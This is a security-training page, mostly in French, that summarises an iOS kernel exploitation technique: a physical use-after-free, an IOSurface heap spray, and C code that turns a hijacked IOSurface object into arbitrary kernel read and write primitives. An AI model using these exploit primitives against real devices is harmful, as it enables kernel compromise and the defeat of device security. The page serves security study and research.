# iOS Physical Use After Free via IOSurface

{{#include ../../banners/hacktricks-training.md}}


## Atténuations des exploits iOS

- **Code Signing** in iOS works by requiring every piece of executable code (apps, libraries, extensions, etc.) to be cryptographically signed with a certificate issued by Apple. When code is loaded, iOS verifies the digital signature against Apple’s trusted root. If the signature is invalid, missing, or modified, the OS refuses to run it. This prevents attackers from injecting malicious code into legitimate apps or running unsigned binaries, effectively stopping most exploit chains that rely on executing arbitrary or tampered code.
- **CoreTrust** is the iOS subsystem responsible for enforcing code signing at runtime. It directly verifies signatures using Apple’s root certificate without relying on cached trust stores, meaning only binaries signed by Apple (or with valid entitlements) can execute. CoreTrust ensures that even if an attacker tampers with an app after installation, modifies system libraries, or tries to load unsigned code, the system will block execution unless the code is still properly signed. This strict enforcement closes many post-exploitation vectors that older iOS versions allowed through weaker or bypassable signature checks.
- **Data Execution Prevention (DEP)** marque des régions mémoire comme non-exécutables à moins qu'elles ne contiennent explicitement du code. Cela empêche les attaquants d'injecter du shellcode dans des régions de données (comme la stack ou le heap) et de l'exécuter, les forçant à recourir à des techniques plus complexes comme ROP (Return-Oriented Programming).
- **ASLR (Address Space Layout Randomization)** randomise les adresses mémoire du code, des bibliothèques, de la stack et du heap à chaque démarrage. Cela rend beaucoup plus difficile pour un attaquant de prédire où se trouvent des instructions ou gadgets utiles, cassant de nombreuses chaînes d'exploit qui dépendent de dispositions mémoire fixes.
- **KASLR (Kernel ASLR)** applique le même concept de randomisation au kernel iOS. En déplaçant l'adresse de base du kernel à chaque boot, il empêche les attaquants de localiser de manière fiable les fonctions ou structures du kernel, augmentant la difficulté des exploits au niveau kernel qui chercheraient à obtenir un contrôle complet du système.
- **Kernel Patch Protection (KPP)** aussi connu sous le nom **AMCC (Apple Mobile File Integrity)** dans iOS, surveille en continu les pages de code du kernel pour s'assurer qu'elles n'ont pas été modifiées. Si toute altération est détectée — comme un exploit tentant de patcher des fonctions du kernel ou d'insérer du code malveillant — l'appareil panique et redémarre immédiatement. Cette protection rend les exploits persistants du kernel beaucoup plus difficiles, car les attaquants ne peuvent pas simplement hooker ou patcher les instructions du kernel sans provoquer un crash système.
- **Kernel Text Readonly Region (KTRR)** est une fonctionnalité matérielle introduite sur les appareils iOS. Elle utilise le contrôleur mémoire du CPU pour marquer la section code (text) du kernel comme définitivement en lecture seule après le boot. Une fois verrouillée, même le kernel lui-même ne peut pas modifier cette région mémoire. Cela empêche les attaquants — et même le code privilégié — de patcher les instructions du kernel à l'exécution, fermant une grande classe d'exploits qui reposaient sur la modification directe du code du kernel.
- **Pointer Authentication Codes (PAC)** utilisent des signatures cryptographiques intégrées dans des bits inutilisés des pointeurs pour vérifier leur intégrité avant utilisation. Lorsqu'un pointeur (comme une adresse de retour ou un pointeur de fonction) est créé, le CPU le signe avec une clé secrète ; avant la déréférence, le CPU vérifie la signature. Si le pointeur a été altéré, la vérification échoue et l'exécution s'arrête. Cela empêche les attaquants de forger ou réutiliser des pointeurs corrompus dans des exploits de corruption mémoire, rendant des techniques comme ROP ou JOP beaucoup plus difficiles à mettre en œuvre de façon fiable.
- **Privilege Access never (PAN)** est une fonctionnalité matérielle qui empêche le kernel (mode privilégié) d'accéder directement à la mémoire user-space à moins d'activer explicitement l'accès. Cela stoppe les attaquants ayant obtenu une exécution de code kernel d'accéder facilement à la mémoire utilisateur pour escalader des privilèges ou voler des données sensibles. En faisant respecter une séparation stricte, PAN réduit l'impact des exploits kernel et bloque de nombreuses techniques d'escalade de privilèges courantes.
- **Page Protection Layer (PPL)** est un mécanisme de sécurité iOS qui protège des régions critiques de la mémoire gérées par le kernel, en particulier celles liées au code signing et aux entitlements. Il applique des protections strictes en écriture via la MMU (Memory Management Unit) et des contrôles supplémentaires, garantissant que même du code kernel privilégié ne peut modifier arbitrairement des pages sensibles. Cela empêche les attaquants ayant obtenu une exécution au niveau kernel de manipuler des structures critiques pour la sécurité, rendant la persistance et les contournements de code signing significativement plus difficiles.


## Physical use-after-free

Ceci est un résumé du post disponible sur [https://alfiecg.uk/2024/09/24/Kernel-exploit.html](https://alfiecg.uk/2024/09/24/Kernel-exploit.html). De plus, des informations complémentaires sur des exploits utilisant cette technique peuvent être trouvées sur [https://github.com/felix-pb/kfd](https://github.com/felix-pb/kfd)

### Memory management in XNU <a href="#memory-management-in-xnu" id="memory-management-in-xnu"></a>

L'**espace d'adressage mémoire virtuelle** pour les processus utilisateur sur iOS s'étend de **0x0 à 0x8000000000**. Cependant, ces adresses ne correspondent pas directement à la mémoire physique. À la place, le **noyau** utilise des **tables de pages** pour traduire les adresses virtuelles en adresses **physiques** réelles.

#### Niveaux des tables de pages dans iOS

Les tables de pages sont organisées hiérarchiquement en trois niveaux :

1. **L1 Page Table (Level 1)** :
* Chaque entrée ici représente une large plage de mémoire virtuelle.
* Elle couvre **0x1000000000 bytes** (ou **256 GB**) de mémoire virtuelle.
2. **L2 Page Table (Level 2)** :
* Une entrée ici représente une région plus petite de mémoire virtuelle, spécifiquement **0x2000000 bytes** (32 MB).
* Une entrée L1 peut pointer vers une table L2 si elle ne peut pas mapper toute la région elle-même.
3. **L3 Page Table (Level 3)** :
* C'est le niveau le plus fin, où chaque entrée mappe une seule page mémoire de **4 KB**.
* Une entrée L2 peut pointer vers une table L3 si un contrôle plus granulaire est nécessaire.

#### Mappage de la mémoire virtuelle vers la mémoire physique

* **Direct Mapping (Block Mapping)** :
* Certaines entrées d'une table de pages mappent directement une plage d'adresses virtuelles vers une plage contiguë d'adresses physiques (comme un raccourci).
* **Pointer to Child Page Table** :
* Si un contrôle plus fin est nécessaire, une entrée à un niveau (par ex. L1) peut pointer vers une **table de pages enfant** au niveau suivant (par ex. L2).

#### Exemple : Mappage d'une adresse virtuelle

Supposons que vous essayez d'accéder à l'adresse virtuelle **0x1000000000** :

1. **L1 Table** :
* Le noyau vérifie l'entrée de la table L1 correspondant à cette adresse virtuelle. Si elle contient un **pointeur vers une table L2**, il se rend dans cette table L2.
2. **L2 Table** :
* Le noyau vérifie la table L2 pour un mappage plus détaillé. Si cette entrée pointe vers une **table L3**, il poursuit dans cette table.
3. **L3 Table** :
* Le noyau consulte l'entrée finale L3, qui pointe vers l'**adresse physique** de la page mémoire réelle.

#### Exemple de mappage d'adresses

Si vous écrivez l'adresse physique **0x800004000** dans le premier index de la table L2, alors :

* Les adresses virtuelles de **0x1000000000** à **0x1002000000** se mappent vers les adresses physiques de **0x800004000** à **0x802004000**.
* C'est un **block mapping** au niveau L2.

Alternativement, si l'entrée L2 pointe vers une table L3 :

* Chaque page de 4 KB dans la plage virtuelle **0x1000000000 -> 0x1002000000** serait mappée par des entrées individuelles dans la table L3.

### Physical use-after-free

Un **physical use-after-free** (UAF) se produit lorsque :

1. Un processus **alloue** de la mémoire en lecture/écriture.
2. Les **tables de pages** sont mises à jour pour mapper cette mémoire à une adresse physique spécifique que le processus peut accéder.
3. Le processus **désalloue** (libère) la mémoire.
4. Cependant, à cause d'un **bug**, le noyau **oublie de supprimer le mapping** des tables de pages, même s'il marque la mémoire physique correspondante comme libre.
5. Le noyau peut alors **réallouer cette mémoire physique "libérée"** à d'autres fins, par exemple pour des **données du kernel**.
6. Comme le mapping n'a pas été supprimé, le processus peut toujours **lire et écrire** dans cette mémoire physique.

Cela signifie que le processus peut accéder à des **pages de la mémoire du kernel**, qui peuvent contenir des données ou structures sensibles, permettant potentiellement à un attaquant de **manipuler la mémoire du kernel**.

### IOSurface Heap Spray

Puisque l'attaquant ne peut pas contrôler quelles pages kernel spécifiques seront allouées à la mémoire libérée, il utilise une technique appelée **heap spray** :

1. L'attaquant **crée un grand nombre d'objets IOSurface** dans la mémoire kernel.
2. Chaque objet IOSurface contient une **valeur magique** dans l'un de ses champs, ce qui facilite son identification.
3. Il **scanne les pages libérées** pour voir si l'un de ces objets IOSurface a atterri sur une page libérée.
4. Lorsqu'il trouve un objet IOSurface sur une page libérée, il peut l'utiliser pour **lire et écrire la mémoire du kernel**.

Plus d'infos à ce sujet sur [https://github.com/felix-pb/kfd/tree/main/writeups](https://github.com/felix-pb/kfd/tree/main/writeups)

> [!TIP]
> Sachez que les appareils iOS 16+ (A12+) apportent des mitigations matérielles (comme PPL ou SPTM) qui rendent les techniques de physical UAF bien moins viables.
> PPL applique des protections MMU strictes sur les pages liées au code signing, aux entitlements et aux données sensibles du kernel, donc même si une page est réutilisée, les écritures depuis l'userland ou du code kernel compromis vers des pages protégées par PPL sont bloquées.
> Secure Page Table Monitor (SPTM) étend PPL en renforçant les mises à jour des tables de pages elles-mêmes. Il garantit que même le code kernel privilégié ne peut pas remapper silencieusement des pages libérées ou altérer des mappings sans passer par des contrôles sécurisés.
> KTRR (Kernel Text Read-Only Region), qui verrouille la section code du kernel en lecture seule après le boot. Cela empêche toute modification à l'exécution du code du kernel, fermant un vecteur d'attaque majeur sur lequel les exploits de physical UAF s'appuyaient souvent.
> De plus, les allocations `IOSurface` sont moins prévisibles et plus difficiles à mapper dans des régions accessibles par l'utilisateur, ce qui rend la technique de scan de "valeur magique" beaucoup moins fiable. Et `IOSurface` est désormais protégée par des entitlements et des restrictions de sandbox.

### Processus de Heap Spray étape par étape

1. **Spray IOSurface Objects** : L'attaquant crée de nombreux objets IOSurface avec un identifiant spécial ("valeur magique").
2. **Scan Freed Pages** : Il vérifie si l'un des objets a été alloué sur une page libérée.
3. **Read/Write Kernel Memory** : En manipulant des champs de l'objet IOSurface, il obtient la capacité d'effectuer des **lectures et écritures arbitraires** dans la mémoire du kernel. Cela lui permet de :
* Utiliser un champ pour **lire n'importe quelle valeur 32-bit** dans la mémoire du kernel.
* Utiliser un autre champ pour **écrire des valeurs 64-bit**, obtenant un primitive stable de **kernel read/write**.

Generate IOSurface objects with the magic value IOSURFACE\_MAGIC to later search for:
```c
void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
if (*nClients >= 0x4000) return;
for (int i = 0; i < nSurfaces; i++) {
fast_create_args_t args;
lock_result_t result;

size_t size = IOSurfaceLockResultSize;
args.address = 0;
args.alloc_size = *nClients + 1;
args.pixel_format = IOSURFACE_MAGIC;

IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
io_connect_t id = result.surface_id;

(*clients)[*nClients] = id;
*nClients = (*nClients) += 1;
}
}
```
Rechercher des objets **`IOSurface`** dans une page physique libérée:
```c
int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *self_task, uint64_t *puafPage) {
io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
int nSurfaceIDs = 0;

for (int i = 0; i < 0x400; i++) {
spray_iosurface(client, 10, &surfaceIDs, &nSurfaceIDs);

for (int j = 0; j < nPages; j++) {
uint64_t start = puafPages[j];
uint64_t stop = start + (pages(1) / 16);

for (uint64_t k = start; k < stop; k += 8) {
if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
info.object = k;
info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
if (self_task) *self_task = iosurface_get_receiver(k);
goto sprayDone;
}
}
}
}

sprayDone:
for (int i = 0; i < nSurfaceIDs; i++) {
if (surfaceIDs[i] == info.surface) continue;
iosurface_release(client, surfaceIDs[i]);
}
free(surfaceIDs);

return 0;
}
```
### Obtention d'un accès lecture/écriture au kernel avec IOSurface

Après avoir pris le contrôle d'un objet IOSurface dans la mémoire kernel (mappé sur une page physique libérée accessible depuis userspace), on peut l'utiliser pour des **opérations arbitraires de lecture et d'écriture kernel**.

**Champs clés dans IOSurface**

L'objet IOSurface possède deux champs cruciaux :

1. **Use Count Pointer** : Permet une **lecture 32-bit**.
2. **Indexed Timestamp Pointer** : Permet une **écriture 64-bit**.

En écrasant ces pointeurs, on les redirige vers des adresses arbitraires en mémoire kernel, activant des capacités de lecture/écriture.

#### Lecture 32-bit du kernel

Pour effectuer une lecture :

1. Écraser le **use count pointer** pour qu'il pointe vers l'adresse cible moins un offset de 0x14 octets.
2. Utiliser la méthode `get_use_count` pour lire la valeur à cette adresse.
```c
uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
uint64_t args[1] = {surfaceID};
uint32_t size = 1;
uint64_t out = 0;
IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
return (uint32_t)out;
}

uint32_t iosurface_kread32(uint64_t addr) {
uint64_t orig = iosurface_get_use_count_pointer(info.object);
iosurface_set_use_count_pointer(info.object, addr - 0x14); // Offset by 0x14
uint32_t value = get_use_count(info.client, info.surface);
iosurface_set_use_count_pointer(info.object, orig);
return value;
}
```
#### Écriture 64 bits dans le noyau

Pour effectuer une écriture :

1. Écrasez le **indexed timestamp pointer** pour qu'il pointe vers l'adresse cible.
2. Utilisez la méthode `set_indexed_timestamp` pour écrire une valeur 64 bits.
```c
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
uint64_t args[3] = {surfaceID, 0, value};
IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

void iosurface_kwrite64(uint64_t addr, uint64_t value) {
uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
iosurface_set_indexed_timestamp_pointer(info.object, addr);
set_indexed_timestamp(info.client, info.surface, value);
iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
```
#### Exploit Flow Recap

1. **Trigger Physical Use-After-Free**: Des pages libérées sont disponibles pour réutilisation.
2. **Spray IOSurface Objects**: Allouer de nombreux objets IOSurface avec une "magic value" unique dans kernel memory.
3. **Identify Accessible IOSurface**: Localiser un IOSurface sur une page libérée que vous contrôlez.
4. **Abuse Use-After-Free**: Modifier des pointeurs dans l'objet IOSurface pour permettre des **kernel read/write** arbitraires via les méthodes IOSurface.

Avec ces primitives, l'exploit fournit des **32-bit reads** contrôlés et des **64-bit writes** vers kernel memory. Les étapes de jailbreak supplémentaires pourraient impliquer des primitives de read/write plus stables, qui peuvent nécessiter de contourner des protections additionnelles (par ex., PPL sur les appareils arm64e plus récents).

{{#include ../../banners/hacktricks-training.md}}
